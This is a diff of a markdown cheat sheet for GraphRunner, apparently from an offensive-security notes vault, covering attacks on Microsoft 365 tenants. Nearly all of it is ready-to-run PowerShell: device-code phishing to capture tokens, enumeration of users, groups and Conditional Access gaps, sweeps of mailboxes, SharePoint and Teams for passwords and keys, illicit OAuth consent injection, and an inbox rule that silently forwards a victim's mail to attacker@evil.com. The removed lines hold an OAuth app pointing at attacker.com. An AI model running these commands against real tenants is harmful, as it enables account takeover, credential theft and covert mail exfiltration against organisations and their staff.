@@ -15,29 +15,38 @@ Import-Module .\GraphRunner.ps1
 
 > [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Post-Auth Graph Enumeration and Illicit Consent Grant sections.
 
+> [!warning] **Verified against `GraphRunner.ps1` (2026-08).** Several function names in older guides are wrong — there is **no** `Invoke-DeviceCodeFlow`, `Invoke-SearchTeamsMessages`, `Get-ConditionalAccessPolicies`, `Get-AzureADApps`, or any **OneNote** function. The real names are below; every function takes `-Tokens $tokens`. Run `List-GraphRunnerModules` for the current inventory.
+
+---
+
+## The all-in-one — `Invoke-GraphRunner`
+
+```powershell
+# One command runs the whole pillage: Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups,
+# Invoke-DumpCAPS, Invoke-DumpApps, then searches Mailbox/SharePoint+OneDrive/Teams using
+# the default_detectors.json patterns (passwords, keys, cnxn strings, etc.)
+Invoke-GraphRunner -Tokens $tokens
+```
+
+Start here, then use the individual functions below to dig into specific hits.
+
 ---
 
 ## Authentication & Token Management
 
 ```powershell
-# Interactive login (browser)
-Get-GraphTokens
+# Device-code auth by default — displays a user_code to phish (microsoft.com/devicelogin),
+# then polls and captures the token set. Store it in $tokens for every later command.
+$tokens = Get-GraphTokens
+Get-GraphTokens -UserPasswordAuth      # ROPC (username/password) instead of device code
 
-# Device code phishing — generate a code for the target to enter
-Invoke-DeviceCodeFlow -Tenant <tenant-id>
-# Displays user_code — phish the target to microsoft.com/devicelogin
-# Polls and captures token automatically
-
-# Refresh an existing token
-Invoke-RefreshToAzureManagementToken -Tokens $tokens
-Invoke-RefreshToMSGraphToken -Tokens $tokens
+# Refresh into other audiences
+Invoke-RefreshGraphTokens -RefreshToken <rt> -tenantid <tid>
 Invoke-RefreshToSharePointToken -Tokens $tokens -Domain <company>
 
-# Check token validity and scopes
-Invoke-GraphListing -Resource "me" -Tokens $tokens    # simple identity check
-
-# Set tokens globally for session
-$tokens = Get-GraphTokens
+# Import a token set captured elsewhere / keep them fresh automatically
+Invoke-ImportTokens -Tokens $tokens
+Invoke-AutoTokenRefresh -Tokens $tokens
 ```
 
 ---
@@ -45,137 +54,68 @@ $tokens = Get-GraphTokens
 ## Recon
 
 ```powershell
-# Tenant and user info
-Invoke-GraphListing -Resource "me" -Tokens $tokens
-Invoke-GraphListing -Resource "organization" -Tokens $tokens
+# Tenant, current-user privileges, licensing, tenant settings
+Invoke-GraphRecon -Tokens $tokens
 
 # All users
 Get-AzureADUsers -Tokens $tokens
-Get-AzureADUsers -Tokens $tokens | Select-Object DisplayName, UserPrincipalName, JobTitle
 
-# All groups
-Get-AzureADGroups -Tokens $tokens
+# Groups — including the ones useful for privesc
+Get-SecurityGroups  -Tokens $tokens
+Get-DynamicGroups   -Tokens $tokens     # membership rules you may be able to satisfy
+Get-UpdatableGroups -Tokens $tokens     # groups you can add yourself to
 
-# Conditional access policies (find gaps)
-Get-ConditionalAccessPolicies -Tokens $tokens
+# Conditional Access policies (find MFA/location gaps)
+Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
 
-# Registered applications (find over-permissive apps)
-Get-AzureADApps -Tokens $tokens
+# App registrations + delegated/illicit consent grants (over-permissive apps)
+Invoke-DumpApps -Tokens $tokens
 ```
 
 ---
 
-## Teams Pillaging
+## Pillaging (Mailbox / SharePoint+OneDrive / Teams)
 
 ```powershell
-# List all Teams the user belongs to
-Get-Teams -Tokens $tokens
+# Search each store for a keyword (repeat per term, or let Invoke-GraphRunner sweep them)
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 500
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password"   # covers OneDrive too
+Invoke-SearchTeams -Tokens $tokens -SearchTerm "password"
 
-# Get channels for a team
-Get-TeamChannels -Tokens $tokens -TeamId <team-id>
+# Creds hidden in AD user attributes (description/notes fields)
+Invoke-SearchUserAttributes -Tokens $tokens -SearchTerm "password"
 
-# Dump all messages from a channel
-Get-ChannelMessages -Tokens $tokens -TeamId <team-id> -ChannelId <channel-id>
-
-# Search Teams messages for keywords (passwords, secrets, VPN, credentials, etc.)
-Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "password"
-Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "secret"
-Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "vpn"
-Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "ssh"
-Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "credentials"
-
-# Dump ALL Teams messages (thorough but slow)
-Invoke-DumpTeamsMessages -Tokens $tokens
-```
-
----
-
-## SharePoint & OneDrive Pillaging
-
-```powershell
-# List SharePoint sites
-Get-SharePointSiteURLs -Tokens $tokens
-
-# List files in a SharePoint site
-Get-SharePointFiles -Tokens $tokens -SiteUrl <url>
-
-# Search SharePoint for keywords
-Invoke-SearchSharePoint -Tokens $tokens -SearchTerm "password"
-Invoke-SearchSharePoint -Tokens $tokens -SearchTerm "credentials"
-Invoke-SearchSharePoint -Tokens $tokens -SearchTerm ".pfx"
-Invoke-SearchSharePoint -Tokens $tokens -SearchTerm "private key"
-
-# OneDrive files
-Get-OneDriveFiles -Tokens $tokens
-Get-OneDriveFiles -Tokens $tokens -User <upn>
-```
-
----
-
-## Outlook / Email Pillaging
-
-```powershell
-# Read user's email
+# Read a mailbox / list SharePoint sites / Teams data
 Get-Inbox -Tokens $tokens
-Get-Inbox -Tokens $tokens -User <upn>    # requires Mail.Read.All (admin)
-
-# Search email
-Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"
-Invoke-SearchMailbox -Tokens $tokens -SearchTerm "credentials"
-Invoke-SearchMailbox -Tokens $tokens -SearchTerm "reset"
-Invoke-SearchMailbox -Tokens $tokens -User <upn> -SearchTerm "MFA"
-
-# Read specific email
-Get-Email -Tokens $tokens -MessageId <id>
+Get-SharePointSiteURLs -Tokens $tokens
+Get-TeamsChannels -Tokens $tokens
+Get-TeamsChat -Tokens $tokens
 ```
 
----
-
-## OneNote Pillaging
-
-```powershell
-# List notebooks
-Get-OneNoteNotebooks -Tokens $tokens
-
-# Get sections and pages
-Get-OneNotePages -Tokens $tokens -NotebookId <id>
-
-# Search OneNote content
-Invoke-SearchOneNote -Tokens $tokens -SearchTerm "password"
-```
+> [!tip] **Detectors, not one-off terms.** `Invoke-Search*` and `Invoke-GraphRunner` read `default_detectors.json` — edit that file to add your own regex/keywords rather than looping single `-SearchTerm` values by hand.
 
 ---
 
 ## Persistence & Backdoors
 
 ```powershell
-# Add app registration with high-value permissions (for persistent token access)
-Invoke-InjectOAuthApp -Tokens $tokens -AppName "IT Support" `
-  -ReplyUrl "https://attacker.com/callback" `
-  -Scope "Mail.Read,Files.ReadWrite.All,offline_access"
-# Returns a phishing URL — send to target user for OAuth consent
+# Illicit consent grant — inject an OAuth app and get a consent URL to phish
+Invoke-InjectOAuthApp -Tokens $tokens
 
-# Add owner to app registration for persistent secret access
-Invoke-AddOwnerToApp -Tokens $tokens -AppId <app-id> -UserId <your-id>
+# Mailbox forwarding rule (silent exfil of a user's mail)
+Invoke-CreateInboxForwardingRule -Tokens $tokens -RuleName "Sync" -EmailAddress attacker@evil.com
+
+# Group / guest abuse for lateral persistence
+Invoke-SecurityGroupCloner -Tokens $tokens
+Invoke-InviteGuest -Tokens $tokens
 ```
 
 ---
 
-## Useful Searches (Quick Pillage)
-
-```powershell
-# Full pillage run — common credential-bearing search terms
-$terms = @("password", "passwd", "secret", "credential", "vpn", "ssh", "token", "api key", "private key", ".pfx", "keepass")
-foreach ($term in $terms) {
-    Write-Host "[*] Searching: $term"
-    Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm $term
-    Invoke-SearchSharePoint -Tokens $tokens -SearchTerm $term
-    Invoke-SearchMailbox -Tokens $tokens -SearchTerm $term
-}
-```
+> [!note] **Related tooling** — get tokens for `-Tokens` from [[Tools/Cloud/AADInternals|AADInternals]] (`Get-AADIntAccessTokenForMSGraph`); [[Tools/Cloud/BARK|BARK]] executes the Entra *abuse* edges once pillaging finds a path.
 
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
